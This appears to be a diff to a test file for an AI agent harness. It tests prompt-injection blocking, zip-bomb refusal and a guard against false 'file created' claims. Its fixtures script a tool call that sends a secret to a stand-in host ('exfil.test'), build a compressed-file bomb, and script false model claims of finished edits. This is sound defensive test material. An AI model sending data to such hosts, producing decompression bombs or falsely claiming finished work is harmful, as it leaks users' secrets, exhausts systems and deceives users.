@@ -352,7 +352,8 @@ def test_generated_files_open_and_read_back(tmp_path):
     r = TOOLS["make_slides"](
         {"title": "Bilan / 2026", "slides": [{"title": "Ventes", "bullets": ["+4 %", "Deux sites"]}]}, c
     )
-    assert r.startswith("File created: bird_out/bilan-2026-") and "1 slides" in r
+    assert r.startswith("File created and shown to the user as a download card: bilan-2026-") and "1 slides" in r
+    assert "bird_out" not in r and c.files[0].startswith("bird_out/bilan-2026-")
     prs = pptx.Presentation(str(tmp_path / c.files[0]))
     assert len(prs.slides) == 2 and prs.slides[1].shapes.title.text == "Ventes"
     TOOLS["make_document"](
@@ -599,3 +600,150 @@ def test_injection_excerpt_quotes_the_sentence_plain_and_redacted():
     assert "sk_live_abcdef123456" not in quote  # credentials never reach the UI
     assert len(quote) <= 302
     assert guard.injection_excerpt("Une page ordinaire, sans rien de suspect.") == ""
+def test_flagged_run_cannot_read_new_url(tmp_path, monkeypatch):
+    monkeypatch.setitem(DNS, "exfil.test", [PUBLIC])
+    seen = []
+    outs = [
+        call("read_page", url="https://news.test/rates"),
+        call("read_page", url="https://exfil.test/c?d=SECRET"),
+        "Done.",
+    ]
+    agent, _ = make(tmp_path, outs, seen=seen, extra=f"<p>{INJECTION}</p>")
+    run = agent.run("Summarise https://news.test/rates")
+    assert run.flagged and run.steps[0].error is None
+    assert run.steps[1].decision == "blocked" and "untrusted" in run.steps[1].error
+    assert seen and not any("exfil.test" in (a, b) for a, b, _ in seen)
+
+
+def test_flagged_run_still_reads_search_results_and_refuses_long_queries(tmp_path, monkeypatch):
+    seen = []
+    outs = [
+        call("read_page", url="https://news.test/rates"),
+        call("web_search", query="rates"),
+        call("read_page", url="https://news.test/rates?" + "x" * 80),
+        "Done.",
+    ]
+    agent, _ = make(tmp_path, outs, seen=seen, extra=f"<p>{INJECTION}</p>")
+    run = agent.run("What is the key rate? See https://news.test/rates")
+    assert run.flagged and run.steps[2].decision == "blocked"
+    assert len([s for s in seen if s[1] == "news.test"]) == 1  # the first read only
+
+
+def test_unflagged_run_reads_any_public_url(tmp_path, monkeypatch):
+    monkeypatch.setitem(DNS, "other.test", [PUBLIC])
+    agent, _ = make(tmp_path, [call("read_page", url="https://other.test/a"), "Done."])
+    run = agent.run("What is the key rate?")
+    assert run.steps[0].decision == "allow" and run.steps[0].error is None
+
+
+def test_withdrawn_tool_call_refused(tmp_path):
+    seen = []
+    outs = [call("web_search", query="remote work"), "Here is the outline."]
+    agent, llm = make(tmp_path, outs, seen=seen)
+
+    class Counting:
+        calls = 0
+
+        def search(self, *a, **k):
+            Counting.calls += 1
+            return []
+
+    agent.search = Counting()
+    run = agent.run("Fais une présentation de 4 diapositives sur le télétravail")
+    assert "web_search" not in json.loads(llm.prompts[0])["tools"]
+    assert run.steps[0].decision == "rejected" and "unknown tool" in run.steps[0].error
+    assert Counting.calls == 0 and not seen
+CLAIM = "Voici la diapositive 6, intégrée à votre présentation."
+
+
+def test_false_file_claim_gets_one_reminder_then_an_honest_answer(tmp_path):
+    agent, llm = make(tmp_path, [CLAIM, "C'est fait, la présentation est mise à jour."])
+    run = agent.run("Ajoute une diapo sur les risques")
+    assert len(llm.prompts) == 2  # regenerated once after the reminder
+    assert "No file exists" in json.loads(llm.prompts[1])["messages"][-1]["content"]
+    assert "pas produit de fichier" in run.answer and run.stop_reason == "answer"
+
+
+def test_false_file_claim_then_the_file_is_made(tmp_path):
+    slides = [{"title": "Risques", "bullets": ["Retard", "Budget"]}]
+    outs = [CLAIM, call("make_slides", title="Risques", slides=slides), "La diapositive est prête."]
+    agent, llm = make(tmp_path, outs)
+    run = agent.run("Ajoute une diapo sur les risques")
+    assert len(llm.prompts) == 3 and run.files and "pas produit" not in run.answer
+
+
+def test_plain_answer_mentioning_a_document_is_untouched(tmp_path):
+    answer = "Le document RH, disponible sur l'intranet, indique 25 jours de congés."
+    agent, llm = make(tmp_path, [answer])
+    run = agent.run("Combien de jours de congés avons-nous ?")
+    assert len(llm.prompts) == 1 and run.answer == answer
+def _bomb(path, size):
+    import zipfile
+
+    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("[Content_Types].xml", "<Types/>")
+        zf.writestr("xl/worksheets/sheet1.xml", b"<c><v>0</v></c>" * (size // 15))
+
+
+@pytest.mark.parametrize("size", [60_000_000, 5_000_000])  # over 50 MB unpacked / a ratio over 100
+def test_xlsx_zip_bomb_is_refused_fast(tmp_path, size):
+    import time
+
+    _bomb(tmp_path / "bomb.xlsx", size)
+    assert (tmp_path / "bomb.xlsx").stat().st_size < 1_000_000
+    t0 = time.monotonic()
+    with pytest.raises(guard.ToolError, match="trop volumineux"):
+        TOOLS["read_file"]({"path": "bomb.xlsx"}, ctx(tmp_path))
+    assert time.monotonic() - t0 < 2
+
+
+def test_office_text_stops_at_the_cap(tmp_path, monkeypatch):
+    import openpyxl
+
+    from birds.harness.tools import files
+
+    wb = openpyxl.Workbook()
+    for i in range(500):
+        wb.active.append([f"ligne {i}", i, "texte assez long pour remplir la feuille"])
+    wb.save(tmp_path / "grand.xlsx")
+    monkeypatch.setattr(files, "TEXT_CAP", 2000)
+    text = TOOLS["read_file"]({"path": "grand.xlsx"}, ctx(tmp_path))
+    assert text.endswith("lines)") and "tronqué après" in text and len(text) < 2200
+    assert "ligne 0" in text and "ligne 499" not in text
+    monkeypatch.setattr(files, "TEXT_CAP", 200_000)
+    assert "ligne 499" in TOOLS["read_file"]({"path": "grand.xlsx"}, ctx(tmp_path))
+
+
+@pytest.mark.parametrize(
+    "ask,answer",
+    [
+        ("How do I update a slide in PowerPoint?", "Open the deck, select the slide; once edited the slide is updated."),
+        ("Comment ajouter une diapo dans PowerPoint ?", "Cliquez sur Nouvelle diapositive : la diapositive est prête."),
+        ("Mets à jour mon planning : réunion lundi 14h.", "Noté : lundi 14h réunion. Le document reste disponible."),
+        (
+            "Ajoute des idées pour ma présentation de demain",
+            "Voici quelques idées pour que votre présentation soit prête : 1. Ouvrir sur un chiffre clé.",
+        ),
+        (
+            "Mets à jour ce paragraphe avec la date de mars 2026 : « Le document de référence sera disponible bientôt. »",
+            "Voici le paragraphe mis à jour : le document de référence est disponible depuis mars 2026.",
+        ),
+    ],
+)
+def test_inline_answers_to_edit_or_howto_asks_are_kept(tmp_path, ask, answer):
+    agent, llm = make(tmp_path, [answer, answer])
+    run = agent.run(ask)
+    assert len(llm.prompts) == 1 and run.answer == answer
+
+
+def test_english_false_claim_is_reminded_then_honest(tmp_path):
+    agent, llm = make(tmp_path, ["Here is slide 6, added to your presentation.", "Done, the deck is updated."])
+    run = agent.run("Add a slide on risks")
+    assert len(llm.prompts) == 2 and "did not produce a file" in run.answer
+
+
+def test_inline_answer_after_the_reminder_is_kept(tmp_path):
+    inline = "Je ne peux pas modifier le fichier ici ; voici le texte de la diapositive : Risques — retard, budget."
+    agent, llm = make(tmp_path, [CLAIM, inline])
+    run = agent.run("Ajoute une diapo sur les risques")
+    assert len(llm.prompts) == 2 and run.answer == inline
